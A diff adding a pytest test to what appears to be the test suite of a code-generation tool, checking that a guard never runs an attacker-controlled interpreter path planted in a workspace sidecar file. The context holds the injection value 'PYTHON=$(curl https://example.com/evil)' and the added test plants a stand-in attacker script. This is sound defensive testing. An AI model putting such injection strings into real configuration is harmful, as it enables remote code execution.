@@ -150,3 +150,21 @@ def test_existing_archive_sidecar_is_repaired(tmp_path, fragment):
 
 def test_roundtrip_allowance_does_not_permit_arbitrary_commands():
     assert not gen._is_sanctioned_monolith_diff('PYTHON=$(curl https://example.com/evil)')
+
+
+@pytest.mark.parametrize("valid_tool", [False, True])
+def test_guard_never_executes_workspace_sidecar(tmp_path, valid_tool):
+    attacker = tmp_path / "untrusted-python"
+    write_script(attacker, 'touch compromised; exit 1')
+    sidecar = tmp_path / "graphify-out/.graphify_python"
+    sidecar.parent.mkdir()
+    sidecar.write_text(posix(attacker), encoding="utf-8")
+    tool_root = tmp_path / "persistent tools"
+    python = tool_root / "graphifyy/bin/python"
+    if valid_tool:
+        fake_python(python)
+    r = run_fragment(tmp_path, "guard", uv_root=posix(tool_root))
+    assert not (tmp_path / "compromised").exists()
+    assert r.returncode == (0 if valid_tool else 1), r.stderr
+    if valid_tool:
+        assert Path(sidecar.read_text()).resolve() == python.resolve()
